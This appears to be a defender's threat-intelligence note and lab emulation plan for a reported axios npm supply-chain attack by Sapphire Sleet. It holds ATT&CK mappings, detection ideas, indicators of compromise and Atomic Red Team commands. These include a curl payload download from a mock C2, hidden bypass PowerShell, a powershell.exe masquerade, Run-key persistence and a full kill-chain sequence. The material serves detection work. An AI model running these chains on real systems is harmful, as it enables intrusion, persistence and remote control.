# Threat Intelligence: Axios npm Supply Chain Compromise (Sapphire Sleet)

**Source:** https://www.microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/
**Date Ingested:** 2026-06-29
**Threat Actor:** Sapphire Sleet (DPRK) — aka UNC1069, STARDUST CHOLLIMA, BlueNoroff, CryptoCore
**Target Sectors:** Finance, cryptocurrency, blockchain, developer environments
**Attack Summary:** Malicious versions of axios (1.14.1, 0.30.4) injected with `plain-crypto-js@4.2.1` as a poisoned dependency. Post-install hook silently downloads a platform-specific RAT from Sapphire Sleet C2. All three major OS platforms targeted.

---

## TTP Table

| # | Technique | ID | Phase | Confidence | Priority | Lab Sim? |
|---|-----------|-----|-------|------------|----------|----------|
| 1 | Supply Chain Compromise: Software Dependencies | T1195.002 | Initial Access | High | P1 | Partial |
| 2 | Command & Scripting: JavaScript (npm post-install hook) | T1059.007 | Execution | High | P1 | Yes |
| 3 | Command & Scripting: PowerShell (RAT, -ep bypass, -w hidden) | T1059.001 | Execution | High | P1 | Yes |
| 4 | Command & Scripting: Visual Basic (VBScript stager) | T1059.005 | Execution | High | P1 | Yes |
| 5 | Command & Scripting: AppleScript (macOS downloader) | T1059.002 | Execution | High | P2 | Yes (macOS) |
| 6 | Command & Scripting: Python (/tmp/ld.py) | T1059.006 | Execution | High | P2 | Yes (Linux) |
| 7 | Ingress Tool Transfer (curl C2 download) | T1105 | Execution | High | P1 | Yes |
| 8 | Obfuscated Files or Information (runtime string reconstruction) | T1027 | Defense Evasion | High | P1 | Partial |
| 9 | Masquerading: Rename System Utilities (PowerShell → wt.exe) | T1036.003 | Defense Evasion | High | P1 | Yes |
| 10 | Hide Artifacts: Hidden Window (-w hidden, cscript //nologo) | T1564.003 | Defense Evasion | High | P1 | Yes |
| 11 | Indirect Command Execution (VBS → cmd.exe → PowerShell) | T1202 | Defense Evasion | Medium | P2 | Yes |
| 12 | Indicator Removal: File Deletion (setup.js, .vbs, .ps1 cleanup) | T1070.004 | Defense Evasion | High | P1 | Yes |
| 13 | Boot/Logon Autostart: Registry Run Keys (HKCU Run\MicrosoftUpdate) | T1547.001 | Persistence | High | P1 | Yes |
| 14 | Application Layer Protocol: Web Protocols (HTTP POST C2) | T1071.001 | C2 | High | P1 | Yes |
| 15 | Non-Standard Port (C2 on port 8000) | T1571 | C2 | High | P1 | Yes |
| 16 | Data Encoding: Standard Encoding (Base64 C2 payloads) | T1132.001 | C2 | High | P2 | Yes |
| 17 | System Information Discovery (OS, hardware, processes) | T1082 | Discovery | High | P1 | Yes |
| 18 | File and Directory Discovery (RAT enumeration) | T1083 | Discovery | High | P2 | Yes |
| 19 | Process Injection (in-memory payload injection) | T1055 | Defense Evasion | Medium | P2 | Partial |

---

## Simulation Plan

### Phase 1 — Initial Access

**T1195.002 — Supply Chain Compromise via npm Dependency**
- Create a private test npm package with a `postinstall` script that calls `node setup.js`
- `setup.js` should echo a benign marker and curl a local web server (mock C2 on localhost)
- Install the package via `npm install` on Win11V2 (192.168.1.54) to verify hook fires
- *Infrastructure needed:* Node.js on endpoint, local Python HTTP server as mock C2
- *Safe boundary:* Never use real malicious packages; create from scratch in the lab

---

### Phase 2 — Execution

**T1059.007 — npm post-install JavaScript execution**
- Atomic: `T1059.007` — verify `npm install` triggers `node setup.js` automatically
- Observable: Wazuh process creation event for `node.exe` parented by `npm`

**T1059.001 — PowerShell with Execution Policy Bypass**
- Atomic: `T1059.001` Test #1 (PowerShell Download Cradle)
- Simulate: `powershell.exe -w hidden -ep bypass -file C:\Windows\Temp\payload.ps1`
- Observable: Wazuh Sysmon EventID 1 (process create), PowerShell script block logging

**T1059.005 — VBScript stager via cscript**
- Atomic: `T1059.005` Test #1
- Simulate: Write benign `.vbs` to `%TEMP%`, execute with `cscript //nologo`
- Observable: Wazuh/Sysmon EventID 1, cscript.exe spawn

**T1105 — Ingress Tool Transfer (curl download)**
- Simulate: `curl -s -X POST -d "test" http://192.168.1.X:8000/payload > %TEMP%\test.ps1`
- Observable: Wazuh network connection log, Sysmon EventID 3

---

### Phase 3 — Defense Evasion

**T1036.003 — Rename System Utilities (wt.exe masquerade)**
- Atomic: `T1036.003` Test #1
- Simulate: `copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\ProgramData\wt.exe`
- Observable: Sysmon EventID 11 (file create), process create with mismatched image name

**T1564.003 — Hidden Window**
- Atomic: `T1564.003` Test #1
- Simulate: `powershell -windowstyle hidden -command "Start-Sleep 5"`
- Observable: Sysmon EventID 1 with `-windowstyle hidden` in command line

**T1070.004 — File Deletion**
- Atomic: `T1070.004` Test #1
- Simulate: Create then delete temp files via `cmd /c del /f`
- Observable: Sysmon EventID 23 (file delete)

**T1027 — Obfuscated Code**
- Simulate: Base64-encoded PowerShell: `powershell -enc <base64_benign_command>`
- Observable: Sysmon EventID 1 with `-enc` flag, PowerShell script block log decode

---

### Phase 4 — Persistence

**T1547.001 — Registry Run Key**
- Atomic: `T1547.001` Test #1
- Simulate: `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MicrosoftUpdate /t REG_SZ /d "C:\ProgramData\wt.exe"`
- Cleanup: `reg delete "HKCU\...\Run" /v MicrosoftUpdate /f`
- Observable: Sysmon EventID 13 (registry value set), Wazuh registry monitor

---

### Phase 5 — C2 Simulation

**T1071.001 + T1571 — HTTP C2 on Non-Standard Port**
- Stand up: `python3 -m http.server 8000` on Kali/attacker VM
- Simulate beacon: `curl -X POST -d "host_id=test" http://192.168.1.X:8000/6202033`
- Observable: Wazuh network event, firewall log, Zeek/Suricata alert on non-standard port

**T1132.001 — Base64 Encoded Data in C2**
- Simulate: Have mock C2 return base64-encoded response; decode and execute benign payload
- Observable: PowerShell script block logging showing `[System.Convert]::FromBase64String`

---

### Phase 6 — Discovery

**T1082 — System Information Discovery**
- Atomic: `T1082` Test #1 (systeminfo, hostname, whoami)
- Simulate: `systeminfo; Get-ComputerInfo; Get-Process`
- Observable: Wazuh command execution

**T1083 — File and Directory Discovery**
- Atomic: `T1083` Test #1
- Simulate: `Get-ChildItem -Recurse C:\Users` or `dir /s /b C:\Users`
- Observable: Sysmon EventID 1

---

## Infrastructure Requirements

| Need | Detail | Have? |
|------|--------|-------|
| Windows endpoint | Win11V2 (192.168.1.54) | Yes |
| Node.js installed | For npm post-install simulation | Verify |
| Mock C2 server | Python HTTP server on attacker VM | Yes |
| Wazuh SIEM | 192.168.1.224, OpenSearch at localhost:9200 | Yes |
| PowerShell script block logging | Enable via GPO on Win11V2 | Verify |
| Sysmon deployed | EventID 1, 3, 11, 13, 23 | Verify |

---

## Detection Opportunities

| Detection | Data Source | ATT&CK ID |
|-----------|------------|-----------|
| `node.exe` spawned by npm with network connection | Sysmon EID 1+3 | T1059.007, T1105 |
| PowerShell with `-ep bypass -w hidden` args | Sysmon EID 1, PS Script Block | T1059.001, T1564.003 |
| `cscript.exe` or `wscript.exe` launching `cmd.exe` | Sysmon EID 1 | T1059.005, T1202 |
| Binary created in `%PROGRAMDATA%` with non-standard name | Sysmon EID 11 | T1036.003 |
| Registry write to `HKCU\...\Run\MicrosoftUpdate` | Sysmon EID 13 | T1547.001 |
| Outbound HTTP POST on port 8000 | Network logs, Zeek | T1071.001, T1571 |
| File deletion of `.vbs`/`.ps1` after execution | Sysmon EID 23 | T1070.004 |
| `curl` with POST body matching `packages.npm.org/product*` | Process args | T1105 |
| PowerShell with `-enc` (Base64 encoded command) | Sysmon EID 1 | T1027 |

---

## Indicators of Compromise

### Network
| Indicator | Type | Note |
|-----------|------|------|
| `sfrclak[.]com` | C2 Domain | Registrar: NameCheap |
| `142.11.206[.]73` | C2 IP | Hostwinds VPS, port 8000 |
| `hxxp://sfrclak[.]com:8000/6202033` | C2 URL | Same path all platforms |

### File System
| Path | Platform | Description |
|------|----------|-------------|
| `%TEMP%\6202033.vbs` | Windows | VBScript dropper |
| `%TEMP%\6202033.ps1` | Windows | PowerShell RAT (self-deleting) |
| `%PROGRAMDATA%\system.bat` | Windows | Persistence BAT |
| `C:\ProgramData\wt.exe` | Windows | PowerShell masquerade |
| `/Library/Caches/com.apple.act.mond` | macOS | Native RAT binary |
| `/tmp/ld.py` | Linux | Python RAT loader |

### Package Identifiers
| Package | Version | Action |
|---------|---------|--------|
| `axios` | 1.14.1 | Malicious — downgrade to 1.14.0 |
| `axios` | 0.30.4 | Malicious — downgrade to 0.30.3 |
| `plain-crypto-js` | 4.2.1 | Malicious dependency — remove |

### Hashes (SHA-256)
| Hash | File |
|------|------|
| `92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a` | macOS com.apple.act.mond |
| `ed8560c1ac7ceb6983ba995124d5917dc1a00288912387a6389296637d5f815c` | Windows 6202033.ps1 (v1) |
| `617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101` | Windows 6202033.ps1 (v2) |
| `f7d335205b8d7b20208fb3ef93ee6dc817905dc3ae0c10a0b164f4e7d07121cd` | Windows system.bat |
| `fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf` | Linux ld.py |

---

## Priority Simulation Queue

| Order | Technique | ID | Platform | Atomic Test |
|-------|-----------|-----|----------|-------------|
| 1 | npm post-install hook execution | T1059.007 | Windows | Custom (no atomic) |
| 2 | PowerShell with bypass + hidden window | T1059.001 + T1564.003 | Windows | T1059.001 #1, T1564.003 #1 |
| 3 | Registry run key persistence | T1547.001 | Windows | T1547.001 #1 |
| 4 | Rename system utility (wt.exe) | T1036.003 | Windows | T1036.003 #1 |
| 5 | VBScript → cmd → PowerShell chain | T1059.005 + T1202 | Windows | T1059.005 #1 |
| 6 | HTTP POST C2 on port 8000 | T1071.001 + T1571 | Windows | Custom curl |
| 7 | File deletion post-execution | T1070.004 | Windows | T1070.004 #1 |
| 8 | System info discovery | T1082 | Windows | T1082 #1 |

---

## Atomic Red Team Test Mapping (Priority 1 Windows)

### T1059.007 — Command and Scripting Interpreter: JavaScript

**Recommended Test:** Test #1 — JScript execution to gather local computer information via cscript

```powershell
Invoke-AtomicTest T1059.007 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1059.007 -TestNumbers 1
```

**Key command:** `cscript "#{jscript}" > %tmp%\T1059.007.out.txt`

**Prerequisites:** Sample JScript auto-downloaded via GetPrereqs. No elevation required.

**Attack fidelity:** Partial. Atomic uses WScript/cscript JScript; the attack fires `node setup.js` via npm post-install. Also manually test: `node -e "require('child_process').exec('whoami')"` to exercise the npm→node→exec chain. Detection should cover both `cscript.exe` and `node.exe` spawning from `npm.cmd`.

**Telemetry:** Sysmon EID 1 (`cscript.exe`/`wscript.exe` with `.js` arg), EID 11 (output file in `%TEMP%`)

---

### T1059.001 — Command and Scripting Interpreter: PowerShell

**Recommended Tests:**
- Test #17 — PowerShell Encoded Command execution (`-e` / `-EncodedCommand`)
- Test #13 — ATHPowerShellCommandLineParameter (requires AtomicTestHarnesses module; exercises `-ep bypass -w hidden` variants)

```powershell
Invoke-AtomicTest T1059.001 -TestNumbers 17
Invoke-AtomicTest T1059.001 -TestNumbers 13   # prereq: Install-Module AtomicTestHarnesses
```

**Key command:** `powershell.exe -e #{obfuscated_code}`

**Prerequisites:** None for Test 17. AtomicTestHarnesses module for Test 13. No elevation required.

**Attack fidelity:** High. RAT delivery uses `powershell.exe -ep bypass -w hidden -f rat.ps1` — directly covered by Test 17 (encoded execution) and Test 13 (parameter variations).

**Telemetry:** Sysmon EID 1 (PS with `-e`/`-ep`/`-w hidden` flags), EID 4104 Script Block Log (decoded content in Microsoft-Windows-PowerShell/Operational), EID 4103 Module Logging

---

### T1059.005 — Command and Scripting Interpreter: Visual Basic

**Recommended Test:** Test #1 — VBScript execution to gather local computer information

```powershell
Invoke-AtomicTest T1059.005 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1059.005 -TestNumbers 1
```

**Key command:** `cscript "#{vbscript}" > $env:TEMP\T1059.005.out.txt`

**Prerequisites:** Sample VBS auto-downloaded via GetPrereqs. No elevation required.

**Attack fidelity:** High. Directly mirrors `cscript //nologo 6202033.vbs`; execution method is identical.

**Telemetry:** Sysmon EID 1 (`cscript.exe` with `.vbs` arg and `//nologo`), EID 4688 process creation

---

### T1564.003 — Hide Artifacts: Hidden Window

**Recommended Test:** Test #1 — Hidden Window

```powershell
Invoke-AtomicTest T1564.003 -TestNumbers 1
```

**Key command:** `Start-Process powershell.exe -WindowStyle hidden calc.exe`

**Prerequisites:** None. No elevation required.

**Attack fidelity:** High. Directly replicates `-WindowStyle Hidden`. VBScript hiding cmd.exe is also captured via the process creation chain when paired with T1202 testing.

**Telemetry:** Sysmon EID 1 (`powershell.exe` with `-WindowStyle Hidden`); process is logged even though no visible window appears

---

### T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys

**Recommended Test:** Test #1 — Reg Key Run

```powershell
Invoke-AtomicTest T1547.001 -TestNumbers 1
Invoke-AtomicTest T1547.001 -TestNumbers 1 -Cleanup
```

**Key command:** `REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"`

**Prerequisites:** None. No elevation required (HKCU write).

**Attack fidelity:** High. Hits the exact HKCU Run key used by Sapphire Sleet. Override value name to `MicrosoftUpdate` for full fidelity: `-InputArgs @{value_name="MicrosoftUpdate"; command_to_execute="C:\ProgramData\wt.exe"}`

**Telemetry:** Sysmon EID 13 (Registry Value Set, path `HKCU\...\Run`), EID 4657 (Object Access auditing if enabled). Alert on value names pointing to `%APPDATA%`, `%TEMP%`, or `%PROGRAMDATA%`.

---

### T1036.003 — Masquerading: Rename System Utilities

**Recommended Test:** Test #5 — powershell.exe running as taskhostw.exe

```powershell
Invoke-AtomicTest T1036.003 -TestNumbers 5
Invoke-AtomicTest T1036.003 -TestNumbers 5 -Cleanup
```

**Key command:**
```
copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y
cmd.exe /K %APPDATA%\taskhostw.exe
```

**Override for attack fidelity:** Substitute destination with `%PROGRAMDATA%\wt.exe`:
```powershell
Invoke-AtomicTest T1036.003 -TestNumbers 5 -InputArgs @{outputfile="C:\ProgramData\wt.exe"}
```

**Prerequisites:** None. No elevation required.

**Attack fidelity:** High concept match. Mechanically identical to attack; only destination name differs.

**Telemetry:** Sysmon EID 1 (`OriginalFileName` field still reads `powershell.exe` even when renamed — primary detection pivot), EID 11 (file copy of `powershell.exe` to unusual path)

---

### T1202 — Indirect Command Execution

**Recommended Test:** Test #2 — Indirect Command Execution via forfiles.exe

```powershell
Invoke-AtomicTest T1202 -TestNumbers 2
```

**Key command:** `forfiles /p c:\windows\system32 /m notepad.exe /c #{process}`

**Prerequisites:** None. No elevation required.

**Attack fidelity:** Moderate. Atomic tests LOLBIN-based indirection; actual attack uses VBScript→cmd→PowerShell. For higher fidelity, run T1059.005 Test 1 then T1059.001 Test 17 in sequence — this naturally produces the VBS→cmd→PS chain observed in the attack.

**Telemetry:** Sysmon EID 1 (unexpected parent-child chain: `cscript.exe` → `cmd.exe` → `powershell.exe`), watch for LOLBIN parents of `cmd.exe` or `powershell.exe`

---

### T1070.004 — Indicator Removal: File Deletion

**Recommended Test:** Test #4 — Delete a Single File (Windows cmd)

```powershell
Invoke-AtomicTest T1070.004 -TestNumbers 4 -GetPrereqs
Invoke-AtomicTest T1070.004 -TestNumbers 4
```

**Key command:** `del /f #{file_to_delete}`

**Prerequisites:** Target file created locally by GetPrereqs. No elevation required.

**Attack fidelity:** High. Directly replicates post-execution cleanup of `6202033.vbs`, `6202033.ps1`, and `setup.js`.

**Telemetry:** Sysmon EID 23 (File Delete archived) or EID 26 (File Delete logged) — **requires Sysmon config with `<FileDelete>` rule targeting `%TEMP%` paths.** Without this rule, file deletion leaves no direct event trace. Verify Sysmon config before running.

---

### T1071.001 — Application Layer Protocol: Web Protocols

**Recommended Test:** Test #1 — Malicious User Agents (PowerShell)

```powershell
Invoke-AtomicTest T1071.001 -TestNumbers 1
```

**Key command:** `Invoke-WebRequest www.google.com -UserAgent "HttpBrowser/1.0" | out-null`

**Prerequisites:** None. No elevation required. Requires outbound HTTP access.

**Attack fidelity:** Moderate. Exercises suspicious HTTP from PowerShell; actual attack uses HTTP POST beaconing from renamed `wt.exe`. Combine with T1036.003 Test 5 for full fidelity. Point at the lab mock C2 (`http://192.168.1.X:8000`) rather than google.com.

**Telemetry:** Sysmon EID 3 (network connection from `powershell.exe`), EID 22 (DNS query), proxy/firewall logs with anomalous user-agent strings

---

### T1571 — Non-Standard Port

**Recommended Test:** Test #1 — Testing usage of uncommonly used port with PowerShell

```powershell
Invoke-AtomicTest T1571 -TestNumbers 1 -InputArgs @{port="8000"; domain="192.168.1.X"}
```

**Key command:** `Test-NetConnection -ComputerName #{domain} -port 8000`

**Prerequisites:** None. No elevation required. Point `domain` at the lab mock C2 (Python HTTP server on port 8000).

**Attack fidelity:** High. Set port to `8000` to exactly match Sapphire Sleet C2. Combine with T1105 Test 8 to simulate the full curl-to-port-8000 download.

**Telemetry:** Sysmon EID 3 (outbound TCP to port 8000), Windows Firewall log

---

### T1082 — System Information Discovery

**Recommended Tests:**
- Test #1 — System Information Discovery (`systeminfo`, `reg query`)
- Test #15 — WMIC hardware enumeration (CPU, memory, OS — matches Sapphire Sleet host inventory)

```powershell
Invoke-AtomicTest T1082 -TestNumbers 1
Invoke-AtomicTest T1082 -TestNumbers 15
```

**Prerequisites:** None. No elevation required.

**Attack fidelity:** High. `systeminfo` directly mirrors OS/hardware recon; Test 15 WMIC commands match the hardware component of the Sapphire Sleet inventory stage.

**Telemetry:** Sysmon EID 1 (`systeminfo.exe`, `wmic.exe`, `reg.exe` process creation). Key signal: rapid sequential execution of multiple discovery commands from a single parent — burst pattern is the primary detection heuristic.

---

### T1105 — Ingress Tool Transfer

**Recommended Test:** Test #8 — Curl Download File

```powershell
Invoke-AtomicTest T1105 -TestNumbers 8 -InputArgs @{remote_file="http://192.168.1.X:8000/payload.ps1"; local_path="$env:TEMP\6202033.ps1"}
Invoke-AtomicTest T1105 -TestNumbers 8 -Cleanup
```

**Key command:** `curl.exe -k #{remote_file} -o #{local_path}`

**Prerequisites:** `curl.exe` at `C:\Windows\System32\curl.exe` — available by default on Windows 10 1803+ and Windows 11. Verify with `where curl`. No elevation required.

**Attack fidelity:** High. Set `remote_file` to `http://192.168.1.X:8000/6202033.ps1` and `local_path` to `$env:TEMP\6202033.ps1` to replicate attack artifacts exactly. Run a `python3 -m http.server 8000` on the attacker VM first. This simultaneously exercises T1105 and T1571.

**Telemetry:** Sysmon EID 3 (curl.exe network connection to non-standard port), EID 11 (file created at `%TEMP%\6202033.ps1`), EID 4688 (`curl.exe` with URL in command line args)

---

## Atomic Execution Sequence (Kill Chain Order)

Run in this order to replicate the full Sapphire Sleet chain end-to-end:

```
1.  T1059.007 #1    — Post-install hook fires (scripting interpreter)
2.  T1059.005 #1    — VBScript stager written and run via cscript
3.  T1564.003 #1    — Hidden PowerShell window spawned
4.  T1202 #2        — Indirect execution chain (LOLBIN proxy)
5.  T1082 #1, #15   — Host recon / hardware inventory
6.  T1105 #8        — Curl RAT download from mock C2 (port 8000)
7.  T1036.003 #5    — PowerShell copied to wt.exe masquerade path
8.  T1547.001 #1    — Run key persistence written to HKCU
9.  T1059.001 #17   — Encoded PowerShell RAT execution
10. T1071.001 #1    — HTTP beacon to mock C2
11. T1571 #1        — Non-standard port (8000) connection
12. T1070.004 #4    — Stager file deletion / cleanup
```

---

## Prerequisites Summary

| Technique | Test # | Elevation | External Download |
|-----------|--------|-----------|------------------|
| T1059.007 | 1 | No | Yes (GetPrereqs) |
| T1059.001 | 17 | No | No |
| T1059.005 | 1 | No | Yes (GetPrereqs) |
| T1564.003 | 1 | No | No |
| T1547.001 | 1 | No | No |
| T1036.003 | 5 | No | No |
| T1202 | 2 | No | No |
| T1070.004 | 4 | No | No (file created locally) |
| T1071.001 | 1 | No | No (outbound HTTP) |
| T1571 | 1 | No | No (outbound TCP) |
| T1082 | 1, 15 | No | No |
| T1105 | 8 | No | Yes (mock C2 required) |

All 12 tests run without elevation — consistent with Sapphire Sleet operating entirely in user context via npm/Node.js.
